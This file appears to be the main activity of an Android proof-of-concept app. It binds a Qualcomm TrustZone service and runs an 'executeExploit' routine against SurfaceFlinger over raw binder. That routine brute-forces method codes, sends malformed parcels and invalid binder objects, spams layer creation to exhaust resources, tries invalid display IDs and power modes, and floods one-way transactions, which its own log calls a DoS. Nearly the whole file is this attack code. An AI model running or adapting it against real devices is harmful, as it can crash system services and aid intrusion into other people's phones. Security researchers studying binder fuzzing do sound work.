package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native int nativeOpenDevice(String path);
    public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
    public static native byte[] nativeBinderGetService(int fd, String serviceName, String descriptor);
    public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
    public static native int nativeBinderWriteToService(int fd, int handle, int code, int flags, byte[] data);
    public static native byte[] nativeBuildSurfaceFlingerParcel(int displayId, int layerId, int what, int x, int y, int w, int h);
    public static native byte[] nativeBuildMalformedParcel(int size, int offsetCount);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService failed");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== SURFACEFLINGER ATTACK VECTOR ==========");

        int fd = nativeOpenDevice("/dev/binder");
        if (fd < 0) {
            fd = nativeOpenDevice("/dev/hwbinder");
        }
        if (fd < 0) {
            appendLog("[!] No binder device");
            return;
        }
        appendLog("[+] Using fd=" + fd);

        appendLog("[*] Getting SurfaceFlinger handle...");
        String[] names = {"SurfaceFlinger", "android.ui.ISurfaceComposer", "android.gui.ISurfaceComposer"};
        int sfHandle = -1;
        for (String name : names) {
            byte[] reply = nativeBinderGetService(fd, name, "android.ui.ISurfaceComposer");
            if (reply != null && reply.length >= 4) {
                int h = ((reply[0] & 0xFF) | ((reply[1] & 0xFF) << 8) |
                         ((reply[2] & 0xFF) << 16) | ((reply[3] & 0xFF) << 24));
                if (h != 0) {
                    sfHandle = h;
                    appendLog("[GETSVC] " + name + " -> handle=" + h);
                    dumpToFile(reply, "getsvc_sf_" + name + ".bin");
                    break;
                }
            }
        }
        if (sfHandle < 0) {
            appendLog("[!] SurfaceFlinger handle not found, assuming handle=0 (context manager)");
            sfHandle = 0;
        }

        appendLog("[*] Testing SurfaceFlinger with handle=" + sfHandle);
        testSurfaceFlingerMethods(fd, sfHandle);

        appendLog("[*] Testing malformed parcels on SurfaceFlinger");
        testMalformedParcels(fd, sfHandle);

        appendLog("[*] Testing resource exhaustion (layer creation spam)");
        testResourceExhaustion(fd, sfHandle);

        appendLog("[*] Testing invalid display/layer IDs");
        testInvalidIds(fd, sfHandle);

        appendLog("[*] Testing large transaction spam (DoS)");
        testTransactionSpam(fd, sfHandle);

        try {
            ParcelFileDescriptor.adoptFd(fd).close();
        } catch (Exception e) {}

        appendLog("========== TEST COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testSurfaceFlingerMethods(int fd, int handle) {
        appendLog("[SF] Brute-forcing method codes 0-60");

        int[] codes = new int[61];
        for (int i = 0; i <= 60; i++) codes[i] = i;

        for (int code : codes) {
            if (stopRequested.get()) break;
            String result = nativeBinderDumpReply(fd, handle, code, 0, null);
            if (result.contains("len=")) {
                appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
                try { Thread.sleep(5); } catch (Exception e) {}
            }
        }

        appendLog("[SF] Trying codes 0x64-0x7F (100-127)");
        for (int code = 0x64; code <= 0x7F; code++) {
            if (stopRequested.get()) break;
            String result = nativeBinderDumpReply(fd, handle, code, 0, null);
            if (result.contains("len=")) {
                appendLog("[SF] code=0x" + Integer.toHexString(code) + " -> " + result);
                try { Thread.sleep(5); } catch (Exception e) {}
            }
        }
    }

    private void testMalformedParcels(int fd, int handle) {
        appendLog("[SF-MALFORM] Sending malformed parcels");

        int[] sizes = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536};
        for (int size : sizes) {
            if (stopRequested.get()) break;
            byte[] data = new byte[size];
            for (int i = 0; i < data.length; i++) data[i] = (byte)(i & 0xFF);
            String result = nativeBinderDumpReply(fd, handle, 4, 0, data);
            appendLog("[SF-MALFORM] size=" + size + " -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }

        appendLog("[SF-MALFORM] Sending parcels with offsets (invalid)");
        for (int offsetCount = 1; offsetCount <= 16; offsetCount++) {
            if (stopRequested.get()) break;
            byte[] data = nativeBuildMalformedParcel(128, offsetCount);
            String result = nativeBinderDumpReply(fd, handle, 4, 0, data);
            appendLog("[SF-MALFORM] offsetCount=" + offsetCount + " -> " + result);
            try { Thread.sleep(10); } catch (Exception e) {}
        }

        appendLog("[SF-MALFORM] Sending parcels with invalid binder objects");
        byte[] objParcel = nativeBuildSurfaceFlingerParcel(0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0);
        String result = nativeBinderDumpReply(fd, handle, 4, 0, objParcel);
        appendLog("[SF-MALFORM] invalid display/layer -> " + result);

        byte[] hugeObjParcel = nativeBuildSurfaceFlingerParcel(0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 1920, 1080);
        result = nativeBinderDumpReply(fd, handle, 6, 0, hugeObjParcel);
        appendLog("[SF-MALFORM] createLayer with invalid params -> " + result);
    }

    private void testResourceExhaustion(int fd, int handle) {
        appendLog("[SF-DOS] Resource exhaustion: creating many layers");

        for (int i = 0; i < 100; i++) {
            if (stopRequested.get()) break;
            byte[] data = nativeBuildSurfaceFlingerParcel(1, i + 1, 0, 0, 0, 100, 100);
            String result = nativeBinderDumpReply(fd, handle, 6, 1, data);
            if (i % 10 == 0) {
                appendLog("[SF-DOS] Layer " + i + " -> " + result);
            }
            try { Thread.sleep(2); } catch (Exception e) {}
        }

        appendLog("[SF-DOS] Trying to destroy non-existent layers");
        for (int i = 0; i < 50; i++) {
            if (stopRequested.get()) break;
            byte[] data = nativeBuildSurfaceFlingerParcel(1, i + 1000, 0, 0, 0, 0, 0);
            String result = nativeBinderDumpReply(fd, handle, 7, 0, data);
            if (i % 10 == 0) {
                appendLog("[SF-DOS] Destroy layer " + (i + 1000) + " -> " + result);
            }
            try { Thread.sleep(2); } catch (Exception e) {}
        }
    }

    private void testInvalidIds(int fd, int handle) {
        appendLog("[SF-INVALID] Testing with invalid display IDs");

        int[] displayIds = {0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0x7FFFFFFF, 0x80000000};
        for (int id : displayIds) {
            if (stopRequested.get()) break;
            byte[] data = nativeBuildSurfaceFlingerParcel(id, 0, 0, 0, 0, 0, 0);
            String result = nativeBinderDumpReply(fd, handle, 1, 0, data);
            appendLog("[SF-INVALID] createDisplay id=0x" + Integer.toHexString(id) + " -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }

        appendLog("[SF-INVALID] Testing setPowerMode with invalid modes");
        int[] modes = {0, 1, 2, 3, 4, 5, 0xFFFFFFFF, 0x7FFFFFFF};
        for (int mode : modes) {
            if (stopRequested.get()) break;
            byte[] data = new byte[8];
            data[0] = (byte)(mode & 0xFF);
            data[1] = (byte)((mode >> 8) & 0xFF);
            data[2] = (byte)((mode >> 16) & 0xFF);
            data[3] = (byte)((mode >> 24) & 0xFF);
            String result = nativeBinderDumpReply(fd, handle, 9, 0, data);
            appendLog("[SF-INVALID] setPowerMode mode=" + mode + " -> " + result);
            try { Thread.sleep(5); } catch (Exception e) {}
        }
    }

    private void testTransactionSpam(int fd, int handle) {
        appendLog("[SF-SPAM] Sending many transactions rapidly");

        for (int i = 0; i < 200; i++) {
            if (stopRequested.get()) break;
            byte[] data = nativeBuildSurfaceFlingerParcel(1, i % 10, i % 10, i % 100, i % 100, 100, 100);
            nativeBinderWriteToService(fd, handle, 4, 1, data);
            if (i % 20 == 0) {
                appendLog("[SF-SPAM] Sent " + (i + 1) + " transactions");
            }
            try { Thread.sleep(1); } catch (Exception e) {}
        }

        appendLog("[SF-SPAM] Sending empty transactions with oneway flag");
        for (int i = 0; i < 100; i++) {
            if (stopRequested.get()) break;
            nativeBinderWriteToService(fd, handle, 0, 1, null);
            if (i % 20 == 0) {
                appendLog("[SF-SPAM] Sent " + (i + 1) + " empty oneway");
            }
            try { Thread.sleep(1); } catch (Exception e) {}
        }
    }

    private void dumpToFile(byte[] data, String filename) {
        File dir = getDumpDir();
        if (dir == null || data == null) return;
        File file = new File(dir, filename);
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
            appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("[DUMP] Failed: " + e.getMessage());
        }
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "surfaceflinger_attack_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== SurfaceFlinger Attack Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Test completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
